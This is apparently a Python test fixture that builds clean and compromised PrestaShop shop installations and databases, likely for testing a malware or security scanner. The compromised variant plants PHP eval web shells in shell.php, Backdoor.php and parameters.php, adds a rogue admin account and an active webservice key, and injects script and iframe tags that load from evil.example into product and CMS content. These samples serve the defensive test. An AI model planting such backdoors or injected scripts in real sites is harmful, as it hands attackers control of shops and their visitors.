"""Testwelt für PrestaShop (2.12.0): eine PrestaShop-8.2-Installation (app, classes, controllers, src, modules, override) und eine SQLite-Datenbank mit den ps_*-Tabellen.
Nicht dasselbe wie ein echter PrestaShop-Server (Tabellen- und Feldnamen von Hand nachgebaut)."""
import os
import sqlite3
import time
from typing import Dict

from fixture import install_mysql_shim, w

COOKIE = "c" * 64
PARAMS_GOOD = """<?php return array (
  'parameters' =>
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'ps_db',
    'database_user' => 'ps_user',
    'database_password' => 'GEHEIM-DB-PASSWORT',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'cookie_key' => '%s',
    'secret' => 'GEHEIM-SECRET-ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    'ps_caching' => 'CacheMemcache',
  ),
);
""" % COOKIE
PARAMS_BAD = PARAMS_GOOD.replace("'cookie_key' => '%s'" % COOKIE, "'cookie_key' => 'kurz'") + "\n@eval(base64_decode($_POST['x']));\n"
DEFINES_GOOD = "<?php\ndefine('_PS_MODE_DEV_', false);\n"
DEFINES_BAD = "<?php\ndefine('_PS_MODE_DEV_', true);\n"
KERNEL = "<?php\nclass AppKernel {\n    const MAJOR_VERSION_STRING = '8';\n    const VERSION = '%s';\n}\n"
SCHEMA = """
CREATE TABLE ps_employee (id_employee INTEGER PRIMARY KEY, firstname TEXT, lastname TEXT, id_profile INTEGER, active INTEGER, date_add TEXT, last_connection_date TEXT, email TEXT, passwd TEXT);
CREATE TABLE ps_configuration (id_configuration INTEGER PRIMARY KEY, name TEXT, value TEXT);
CREATE TABLE ps_webservice_account (id_webservice_account INTEGER PRIMARY KEY, key TEXT, description TEXT, active INTEGER);
CREATE TABLE ps_webservice_permission (id_webservice_permission INTEGER PRIMARY KEY, resource TEXT, method TEXT, id_webservice_account INTEGER);
CREATE TABLE ps_cms_lang (id_cms INTEGER, id_lang INTEGER, content TEXT);
CREATE TABLE ps_product_lang (id_product INTEGER, id_lang INTEGER, description TEXT, description_short TEXT);
CREATE TABLE ps_category_lang (id_category INTEGER, id_lang INTEGER, description TEXT);
CREATE TABLE ps_customtext_lang (id_customtext INTEGER, id_lang INTEGER, text TEXT);
"""


def build_site(root: str, infected: bool, version: str = "8.2.1") -> str:
    site = os.path.join(root, "html", "shop")
    os.makedirs(site, exist_ok=True)
    w(site + "/app/AppKernel.php", KERNEL % version, days_ago=60)
    w(site + "/app/config/parameters.php", PARAMS_BAD if infected else PARAMS_GOOD, days_ago=5 if infected else 90, mode=0o666 if infected else 0o600)
    w(site + "/config/defines.inc.php", DEFINES_BAD if infected else DEFINES_GOOD, days_ago=60)
    for d in ("classes", "controllers", "src/Core"):
        for i in range(60):
            w(site + "/%s/Teil%d.php" % (d, i), "<?php\n// %s %d\n" % (d, i), days_ago=60)
    w(site + "/index.php", "<?php\n// PrestaShop\n", days_ago=60)
    w(site + "/.htaccess", "Options -Indexes\n", days_ago=60)
    w(site + "/img/bild.jpg", "JFIF" + "\x00" * 40, days_ago=30)
    w(site + "/modules/ps_emailsubscription/config.xml", "<module><name>ps_emailsubscription</name><version><![CDATA[2.9.0]]></version><author><![CDATA[PrestaShop]]></author></module>", days_ago=60)
    w(site + "/modules/ps_emailsubscription/composer.json", '{"name": "prestashop/ps_emailsubscription"}', days_ago=60)
    w(site + "/modules/fremdmodul/config.xml", "<module><name>fremdmodul</name><version><![CDATA[1.2.0]]></version><author><![CDATA[Drittanbieter]]></author></module>", days_ago=60)
    w(site + "/override/classes/index.php", "<?php\n", days_ago=60)
    w(site + "/admin123abc/index.php", "<?php\n", days_ago=60)
    if infected:
        w(site + "/install/index.php", "<?php\n", days_ago=5)
        w(site + "/admin/index.php", "<?php\n", days_ago=5)
        w(site + "/override/classes/Product.php", "<?php\nclass Product extends ProductCore {}\n", days_ago=3)
        w(site + "/img/shell.php", "<?php @eval($_POST['x']); ?>", days_ago=2)
        w(site + "/classes/Backdoor.php", "<?php @eval(base64_decode($_GET['c']));", days_ago=2)
    return site


def build_db(path: str, infected: bool) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    now = time.time()

    def ts(days):
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now - days * 86400))
    c = con.cursor()
    c.execute("INSERT INTO ps_employee VALUES (1,'Chef','Inhaber',1,1,?,?,'a@b.c','h')", (ts(900), ts(1)))
    c.execute("INSERT INTO ps_employee VALUES (2,'Eva','Redaktion',2,1,?,?,'a@b.c','h')", (ts(300), ts(5)))
    conf = {"PS_WEBSERVICE": "0" if not infected else "1", "PS_SSL_ENABLED": "1" if not infected else "0", "PS_SSL_ENABLED_EVERYWHERE": "1" if not infected else "0", "PS_DISABLE_OVERRIDES": "0"}
    for i, (k_, v) in enumerate(conf.items(), 1):
        c.execute("INSERT INTO ps_configuration VALUES (?,?,?)", (i, k_, v))
    c.execute("INSERT INTO ps_configuration VALUES (9,'PS_SHOP_NAME','Testshop')")
    c.execute("INSERT INTO ps_cms_lang VALUES (1,1,'<p>Impressum</p>')")
    if infected:
        c.execute("INSERT INTO ps_employee VALUES (3,'Admin','Admin',1,1,?,?,'a@b.c','h')", (ts(2), "0000-00-00 00:00:00"))
        c.execute("INSERT INTO ps_webservice_account VALUES (1,'GEHEIM-WS-KEY','Kassensystem',1)")
        c.execute("INSERT INTO ps_webservice_permission VALUES (1,'products','PUT',1)")
        c.execute("INSERT INTO ps_cms_lang VALUES (2,1,'<p>x</p><script>eval(atob(\"YWxlcnQoMSk=\"))</script>')")
        c.execute("INSERT INTO ps_product_lang VALUES (1,1,'<iframe src=\"https://evil.example/x\"></iframe>','')")
        c.execute("INSERT INTO ps_customtext_lang VALUES (1,1,'<script src=\"https://evil.example/x.js\"></script>')")
    con.commit()
    con.close()


def make_prestashop_world(base: str, infected: bool = True, version: str = "8.2.1") -> Dict[str, str]:
    tag = "ps_%s_%s" % ("infected" if infected else "clean", version.replace(".", "_"))
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_site(home, infected, version)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/shop", "db": dbp, "bin": bin_dir}
